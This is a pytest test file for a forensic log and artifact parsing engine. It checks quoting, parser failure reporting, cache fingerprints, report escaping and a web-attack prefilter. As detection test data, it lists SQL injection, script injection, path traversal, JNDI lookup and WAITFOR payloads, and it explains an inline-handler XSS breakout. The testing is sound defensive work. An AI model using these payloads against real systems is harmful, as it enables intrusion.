    """The only handler that builds a PowerShell -Command string rather than an
    argv list. Case folder names carrying an apostrophe are ordinary here, and
    an unescaped quote ends the literal early: the rest of the path is parsed as
    code, the command fails, and that machine's logs are never analysed."""
    from artifact_engine.handlers import win_deepblue

    assert win_deepblue._ps_quote(Path(r"C:\Cases\de l'Exemple\x")) \
        == r"'C:\Cases\de l''Exemple\x'"

    evidence = tmp_path / "de l'Exemple" / "host"
    logs = evidence / "Windows" / "System32" / "winevt" / "Logs"
    logs.mkdir(parents=True)
    (logs / "Security.evtx").write_bytes(b"ElfFile\x00")
    tools = tmp_path / "tools" / "deepbluecli-master"
    tools.mkdir(parents=True)
    (tools / "DeepBlue.ps1").write_text("param($p)\n", encoding="utf-8")

    seen: list[list] = []
    monkeypatch.setattr(win_deepblue.procs, "run",
                        lambda cmd, **kw: seen.append(cmd) or (0, "", ""))
    win_deepblue.run(ParserContext(
        evidence=evidence, out=tmp_path / "CSVs", tools=tmp_path / "tools",
        assets=tmp_path, machine_name="host", volume="live", log=None))

    assert len(seen) == 1
    ps = seen[0][-1]
    assert "l''Exemple" in ps and "l'Exemple\\" not in ps.replace("l''Exemple", "")
    # every quote in the built command pairs up, so nothing escapes the literals
    assert ps.count("'") % 2 == 0


def test_suspicious_columns_are_yes_or_empty_across_every_parser():
    """"Show me everything flagged" is one filter over every CSV -- `suspicious` is
    not blank -- and the per-handler sort key is `r[N] != "yes"`. A parser writing
    `no` for the negative case (auditd_config did, alone) drops all of its rows into
    that filter. Pin the convention at the source so the next parser follows it."""
    import re as _re

    # core/ too, not just handlers/: lateral.py writes its own `suspicious` column
    # into the file the analyst filters BY HAND, and escaped this test for exactly
    # as long as the glob stopped at handlers/.
    pkg = Path(__file__).resolve().parent.parent / "src" / "artifact_engine"
    offenders = []
    for f in sorted(pkg.glob("handlers/*.py")) + sorted(pkg.glob("core/*.py")):
        src = f.read_text(encoding="utf-8")
        if '"suspicious"' not in src:
            continue
        # a literal "no" in the value position of a row append / ternary.
        # A file may legitimately carry OTHER two-valued columns where "no" is a
        # real answer rather than a value that drops every row into the flagged
        # filter (lateral.py's `src_case`). Those opt out by saying so on the
        # line above, which keeps the exemption visible in review.
        lines = src.splitlines()
        for m in _re.finditer(r'else\s+"no"|,\s*"no"\s*\]', src):
            n = src[:m.start()].count(chr(10))          # 0-based index of this line
            context = "\n".join(lines[max(0, n - 2):n + 1])
            if "not `suspicious`" in context:
                continue
            offenders.append(f"{f.name}:{n + 1}")
    assert not offenders, f'parsers writing "no" instead of "" for suspicious: {offenders}'


def test_delimiter_detection_is_not_fooled_by_a_hostile_cell(tmp_path):
    """Counting separators over raw bytes let one quoted cell decide the layout of
    the whole artifact: a semicolon-dense payload -- exactly what a scanner puts in
    a query string -- outvotes the real commas, the table collapses to one column,
    and nothing raises. It is the worst shape of bug here, because row counts and
    file existence still look right."""
    from artifact_engine.core.consolidate import _read_csv

    p = tmp_path / "web_access.csv"
    p.write_text(
        "timestamp,client,method,path,status,query\n"
        '2026-01-01T00:00:01,10.0.0.5,GET,/index.php,200,"id=1;WAITFOR;SELECT;a;b;c;d;e;f;g;h"\n'
        '2026-01-01T00:00:02,10.0.0.6,GET,/admin,404,"x=1;y=2;z=3;p=4;q=5;r=6;s=7;t=8;u=9"\n',
        encoding="utf-8")
    df = _read_csv(p)
    assert list(df.columns) == ["timestamp", "client", "method", "path", "status", "query"], (
        f"delimiter misdetected, table collapsed to {list(df.columns)}")
    assert len(df) == 2


def test_semicolon_delimited_files_are_still_detected(tmp_path):
    """The plausibility check must not break the case it was not aimed at: some
    tools genuinely emit `;`."""
    from artifact_engine.core.consolidate import _read_csv

    p = tmp_path / "euro.csv"
    p.write_text("host;user;when\nHOST-01;jdoe;2026-01-01\nHOST-02;asmith;2026-01-02\n",
                 encoding="utf-8")
    df = _read_csv(p)
    assert list(df.columns) == ["host", "user", "when"]


def test_an_unreadable_csv_says_so_instead_of_vanishing(tmp_path, caplog):
    """A table that fails to read used to disappear from the .db and the .xlsx
    with no log line, while the parser still reported `ok`. An analyst cannot
    distinguish that from an artifact that was never collected, and reads the
    second as "nothing happened here"."""
    import pandas as pd

    from artifact_engine.core import consolidate

    p = tmp_path / "mft.csv"
    p.write_text("a,b\n1,2\n", encoding="utf-8")

    def _boom(*a, **k):
        raise MemoryError("Unable to allocate 6.4 GiB")

    with caplog.at_level("WARNING"):
        orig, pd.read_csv = pd.read_csv, _boom
        try:
            assert consolidate._read_csv(p) is None
        finally:
            pd.read_csv = orig
    msgs = "\n".join(r.getMessage() for r in caplog.records)
    assert "mft.csv" in msgs, "an unreadable table must be named, not dropped in silence"
    assert "MemoryError" in msgs, "the failure type is what tells the analyst it was not evidence"


def test_a_vanished_scratch_dir_costs_one_parser_not_the_run(tmp_path):
    """A parser's private .work_<id> dir disappearing mid-run raised out of
    run_parser, and from inside a pool worker that becomes a BrokenProcessPool --
    it killed a 22-machine case at 130 seconds. On Windows the usual cause is
    antivirus quarantining what the parser just wrote, which hayabusa's base64
    view invites by lifting encoded PowerShell out of the event logs."""
    import shutil as _shutil
    import sys
    import types

    def _selfdestruct(ctx):
        ctx.out.mkdir(parents=True, exist_ok=True)
        (ctx.out / "partial.csv").write_text("a,b" + chr(10) + "1,2" + chr(10),
                                            encoding="utf-8")
        _shutil.rmtree(ctx.out)          # what AV quarantine looks like from here

    p = ParserManifest(id="gone", short="gone", category="Execution",
                       handler="tests._gone_handler:run")
    mod = types.ModuleType("tests._gone_handler")
    mod.run = _selfdestruct
    sys.modules["tests._gone_handler"] = mod
    try:
        res = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    finally:
        del sys.modules["tests._gone_handler"]

    assert res.status == "error", "a vanished scratch dir must be a parser error"
    assert "disappeared" in res.detail, f"unhelpful detail: {res.detail!r}"
    # no marker -> the next run retries instead of trusting output that was taken away
    marker = runner_marker(tmp_path / "CSVs", "gone")
    assert not marker.exists(), "a .done was written for output that never landed"


def test_a_vanished_scratch_dir_names_antivirus_as_the_likely_cause(tmp_path):
    """The message has to point somewhere. "FileNotFoundError" sends the analyst
    looking for a bug in the engine; naming AV sends them to the right place."""
    import shutil as _shutil
    import sys
    import types

    def _selfdestruct(ctx):
        ctx.out.mkdir(parents=True, exist_ok=True)
        _shutil.rmtree(ctx.out)

    p = ParserManifest(id="gone2", short="gone2", category="Execution",
                       handler="tests._gone2_handler:run")
    mod = types.ModuleType("tests._gone2_handler")
    mod.run = _selfdestruct
    sys.modules["tests._gone2_handler"] = mod
    try:
        res = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    finally:
        del sys.modules["tests._gone2_handler"]
    assert "antivirus" in res.detail.lower()


def test_a_failing_parser_carries_its_traceback_back_as_data(tmp_path):
    """run_parser executes in a process-pool worker by default, and a worker's
    logger has no handlers -- so the traceback added in v0.7.1 was written with a
    log call that reached nothing. Measured on a real case: 1208 diagnostic lines
    from the parent, ZERO from workers. It travels as data now, like the errors
    consolidate_unit already returns for the same reason."""
    import sys
    import types

    def _explode(ctx):
        raise MemoryError()

    p = ParserManifest(id="oom", short="oom", category="Execution",
                       handler="tests._oom_handler:run")
    mod = types.ModuleType("tests._oom_handler")
    mod.run = _explode
    sys.modules["tests._oom_handler"] = mod
    try:
        res = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    finally:
        del sys.modules["tests._oom_handler"]

    assert res.status == "error"
    # MemoryError stringifies to "", so the type is the ONLY thing identifying it
    assert "MemoryError" in res.detail
    assert "Traceback" in res.trace, "no traceback came back with the result"
    assert "_explode" in res.trace, "the traceback does not name where it failed"


def test_a_successful_parser_carries_no_traceback(tmp_path):
    """The field must stay empty on the happy path -- a run.json fat with empty
    tracebacks is its own problem."""
    import sys
    import types

    p = ParserManifest(id="fine", short="fine", category="Execution",
                       handler="tests._fine_handler:run")
    mod = types.ModuleType("tests._fine_handler")
    mod.run = lambda ctx: None
    sys.modules["tests._fine_handler"] = mod
    try:
        res = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    finally:
        del sys.modules["tests._fine_handler"]
    assert res.trace == ""


def test_a_failing_parser_reports_the_exception_type(tmp_path):
    """`str(e)` on a KeyError is one quoted token: it reads like a corrupt-evidence
    message when it may be a parser broken on every machine in the case."""
    import sys
    import types

    def _explode(ctx):
        raise KeyError("Computer")

    p = ParserManifest(id="boom", short="boom", category="Execution",
                       handler="tests._boom_handler:run")
    mod = types.ModuleType("tests._boom_handler")
    mod.run = _explode
    sys.modules["tests._boom_handler"] = mod
    try:
        res = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    finally:
        del sys.modules["tests._boom_handler"]
    assert res.status == "error"
    assert "KeyError" in res.detail, f"detail carries no exception type: {res.detail!r}"


def test_fingerprint_follows_the_handler_into_its_shared_helpers():
    """A .done marker never expires, so a fingerprint that misses a dependency
    serves output from a version already known to be broken -- for every case
    already processed, for good. 51 handlers share `_lincommon` and a dozen
    import private helpers from a sibling handler; both edges must be inside the
    digest. Asserted on the closure, not on a hash, so a failure names the
    module that went missing."""
    from artifact_engine.core.runner import _handler_closure

    blob = _handler_closure("artifact_engine.handlers.win_yara:run").decode(
        "utf-8", "replace")
    for reached in ("artifact_engine.handlers._lincommon",     # shared writer
                    "artifact_engine.handlers.lin_yara",       # sibling handler
                    "artifact_engine.core.runner"):            # HandlerSkip
        assert f"\n--{reached}--\n" in blob, f"closure never reaches {reached}"


def test_fingerprint_changes_when_a_shared_helper_changes(tmp_path, monkeypatch):
    """The behaviour the closure exists for: edit a helper the handler does not
    name in its own file, and the parser must re-run."""
    from artifact_engine.core import runner

    pkg = tmp_path / "fakepkg"
    (pkg / "handlers").mkdir(parents=True)
    (pkg / "__init__.py").write_text("", encoding="utf-8")
    (pkg / "handlers" / "__init__.py").write_text("", encoding="utf-8")
    helper = pkg / "handlers" / "_shared.py"
    helper.write_text("def write(rows):\n    return rows\n", encoding="utf-8")
    (pkg / "handlers" / "h_one.py").write_text(
        "from fakepkg.handlers._shared import write\n\n"
        "def run(ctx):\n    return write([])\n", encoding="utf-8")

    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.setattr(runner, "_PKG", "fakepkg")
    runner._SRC_CACHE.clear()
    before = runner._handler_closure("fakepkg.handlers.h_one:run")

    helper.write_text("def write(rows):\n    return sorted(rows)\n", encoding="utf-8")
    runner._SRC_CACHE.clear()
    after = runner._handler_closure("fakepkg.handlers.h_one:run")

    assert before != after, "editing a shared helper left the fingerprint untouched"


def test_a_corrupt_done_marker_means_not_cached_rather_than_ending_the_run(tmp_path):
    """is_cached runs before the pools exist, outside any try, so an exception
    here takes down the whole run instead of one parser. A marker half-written
    by a power loss must read as "re-run this", not as a fatal error."""
    from artifact_engine.core import runner
    from artifact_engine.models import ParserManifest

    p = ParserManifest(id="demo", short="demo", category="Execution",
                       handler="artifact_engine.handlers.lin_bash:run")
    runner.marker_path(tmp_path, "demo").write_bytes(b"\xff\xfe\x00broken")
    assert runner.is_cached(p, tmp_path) is False


def test_web_report_credits_db_ip_in_the_page_itself(tmp_path):
    """The country/ASN columns and the map are resolved from db-ip's CC BY 4.0
    lite databases, and CC BY wants the credit where the work is USED -- i.e. in
    the report handed to a client, not only in the repository they never see.
    Assert on the rendered page, not on the template, so the credit cannot be
    lost by a change in how the page is assembled."""
    from artifact_engine.handlers import _web_report

    dest = tmp_path / "web_metrics.html"
    _web_report.render(dest, "HOST-01", "2026-01-01 00:00:00", ["2026-01-01"],
                       [], [], [], tmp_path)
    page = dest.read_text(encoding="utf-8")
    assert "db-ip.com" in page, "the db-ip attribution is missing from the report"
    assert "CC BY 4.0" in page, "the licence the credit is given under is missing"


def test_no_report_template_interpolates_a_value_into_an_inline_handler():
    """`onclick="select('${ip}')"` puts an evidence-derived value into JavaScript
    SOURCE rather than into text. The CLF parser takes the client host as a bare
    non-whitespace token and only validates the X-Forwarded-For branch, so a
    planted access-log line reaches that slot: one apostrophe closes the string
    and the rest of the field executes when the analyst opens the report. Bind
    through `data-*` plus a listener, where the value stays data."""
    import re as _re

    pkg = Path(__file__).resolve().parent.parent / "src" / "artifact_engine"
    offenders = []
    for rel in ("handlers/_web_report.py", "core/lateral_report.py"):
        src = (pkg / rel).read_text(encoding="utf-8")
        assert "<script" in src, (
            f"{rel} carries no template, so this scan proves nothing -- it moved")
        for m in _re.finditer(r'\son\w+="[^"\n]*\$\{', src):
            offenders.append(f"{rel}:{src[:m.start()].count(chr(10)) + 1}")
    assert not offenders, f"inline handler carrying an interpolated value: {offenders}"


def test_both_report_templates_escape_the_same_five_characters():
    """Each report embeds its own esc() in the page it generates, and the comment
    in _web_report.py says the duplication is deliberate: one rule to remember
    rather than two subtly different ones. They drifted anyway -- neither escaped
    `'`, the character that makes an inline handler exploitable -- so pin the
    pair, not either one alone."""
    pkg = Path(__file__).resolve().parent.parent / "src" / "artifact_engine"
    wanted = ["&amp;", "&lt;", "&gt;", "&quot;", "&#39;"]
    for rel in ("handlers/_web_report.py", "core/lateral_report.py"):
        src = (pkg / rel).read_text(encoding="utf-8")
        i = src.find("function esc(")
        if i == -1:
            i = src.find("esc=t=>")
        assert i != -1, f"{rel}: no esc() found in the embedded template"
        body = src[i:i + 300]
        missing = [w for w in wanted if w not in body]
        assert not missing, f"{rel}: esc() never produces {missing}"


def test_auditd_config_flags_only_what_is_wrong(tmp_path):
    from artifact_engine.handlers import lin_auditd_config
    audit = tmp_path / "[root]" / "etc" / "audit"
    audit.mkdir(parents=True)
    (audit / "audit.rules").write_text("-w /etc/passwd -p wa -k identity\n-e 1\n",
                                       encoding="utf-8")
    (audit / "auditd.conf").write_text("write_logs = yes\nlog_file = /var/log/audit/audit.log\n",
                                       encoding="utf-8")
    out = tmp_path / "CSVs"
    lin_auditd_config.run(_ctx(tmp_path, out))
    body = (out / "auditd_config.csv").read_text(encoding="utf-8").splitlines()[1:]
    assert body and all(r.endswith(",") for r in body)      # healthy host: nothing flagged


def test_a_locked_output_is_reported_and_not_marked_done(tmp_path, monkeypatch):
    """A parser writes into a private work dir, then its files are moved into the
    category folder. If that move fails -- the analyst has last run's CSV open in
    Excel -- the result is lost; reporting "ok" would also write a .done marker, so
    the next run would skip the parser and the data would stay missing."""
    from artifact_engine.core import runner
    from artifact_engine.models import ParserManifest

    out = tmp_path / "CSVs"
    ctx = ParserContext(evidence=tmp_path, out=out, tools=tmp_path, assets=tmp_path,
                        machine_name="host", volume="live", log=None)

    def handler(c):
        c.out.mkdir(parents=True, exist_ok=True)
        (c.out / "locked.csv").write_text("a,b\n1,2\n", encoding="utf-8")

    import types
    mod = types.ModuleType("_fake_locked_handler")
    mod.run = handler
    monkeypatch.setitem(__import__("sys").modules, "_fake_locked_handler", mod)
    real_replace = runner.os.replace

    def replace(src, dst):
        if str(dst).endswith("locked.csv"):
            raise PermissionError(32, "The process cannot access the file")
        return real_replace(src, dst)

    monkeypatch.setattr(runner.os, "replace", replace)
    p = ParserManifest(id="locked", handler="_fake_locked_handler:run")
    res = runner.run_parser(p, ctx)

    assert res.status == "error"
    assert "locked.csv" in res.detail and "Excel" in res.detail
    assert not runner.marker_path(out, "locked").exists()   # so the next run retries


def test_consolidate_degrades_to_db_when_the_xlsx_is_locked(tmp_path, monkeypatch):
    """The workbook is opened before any table is read. With last run's .xlsx open in
    Excel that raises, and letting it escape left the .db abandoned half built -- an
    empty file that looks like a valid result."""
    from artifact_engine.core import consolidate
    from artifact_engine.core.detector import Machine

    mdir = tmp_path / "host"
    (mdir / "CSVs" / "EventLogs").mkdir(parents=True)
    (mdir / "CSVs" / "EventLogs" / "auth.csv").write_text(
        "timestamp,event\n2026-05-01T00:00:00+02:00,ssh_accepted\n", encoding="utf-8")
    machine = Machine(name="host", os="linux", collector="uac",
                      profile_id="linux_uac", path=mdir)

    def locked(*a, **kw):
        raise PermissionError(13, "Permission denied")

    monkeypatch.setattr(consolidate.pd, "ExcelWriter", locked)
    consolidate.build(machine)

    db = mdir / "host.db"
    assert db.is_file() and not (mdir / "host.xlsx").exists()
    import sqlite3
    with sqlite3.connect(db) as c:      # the .db is complete, not an empty shell
        tables = [r[0] for r in c.execute("SELECT name FROM sqlite_master WHERE type='table'")]
    assert tables == ["auth"]


def test_the_prefilter_still_catches_an_uppercase_payload():
    """IGNORECASE was dropped for speed and the haystack is lowercased instead.
    If either half of that pairing is ever undone, attacks in upper or mixed case
    stop being detected -- silently, because a miss looks like benign traffic."""
    from artifact_engine.handlers._webrules import prefilter

    for payload in ("/x?id=1 UNION SELECT 1,2", "/?q=<SCRIPT>alert(1)</SCRIPT>",
                    "/?f=../../ETC/PASSWD", "/?x=${JNDI:ldap://a}",
                    "/?c=Base64_Decode(x)"):
        assert prefilter(payload), f"missed in upper case: {payload}"


def test_every_prefilter_literal_is_lowercase():
    """The pattern is matched case-SENSITIVELY against a lowercased haystack, so an
    uppercase character in the pattern can never match anything. Pinned here
    because the failure is invisible: the rule simply stops firing."""
    import re as _re

    from artifact_engine.handlers._webrules import _PREFILTER

    assert not (_PREFILTER.flags & _re.IGNORECASE), (
        "IGNORECASE is back; prefilter() lowercases already, so this is pure cost")
    upper = [c for c in _PREFILTER.pattern if c.isupper()]
    assert not upper, f"uppercase in a case-sensitive pattern, can never match: {upper}"


def test_a_request_with_escaped_quotes_still_parses():
    """The access-log regex was rewritten as an unrolled loop for speed. Escaped
    quotes inside the request/UA are exactly what the alternation form existed to
    handle, and an attack line is where they show up."""
    from artifact_engine.handlers._webcommon import parse

    line = (r'10.0.0.5 - - [19/May/2026:09:11:17 +0200] '
            r'"GET /a?q=\"x\" HTTP/1.1" 200 5 "-" "curl/8 \"probe\""')
    rec = parse(line)
    assert rec is not None, "a line with escaped quotes no longer parses"
    assert rec.ip == "10.0.0.5"
    assert rec.method == "GET"
    assert rec.status == "200"
    assert "probe" in rec.ua


def test_an_ordinary_line_parses_unchanged():
    from artifact_engine.handlers._webcommon import parse

    rec = parse('10.0.0.5 - - [19/May/2026:09:11:17 +0200] '
                '"GET /index.php?id=1 HTTP/1.1" 200 512 "-" "Mozilla/5.0"')
    assert (rec.ip, rec.method, rec.path, rec.query, rec.status, rec.size) == \
           ("10.0.0.5", "GET", "/index.php", "id=1", "200", "512")
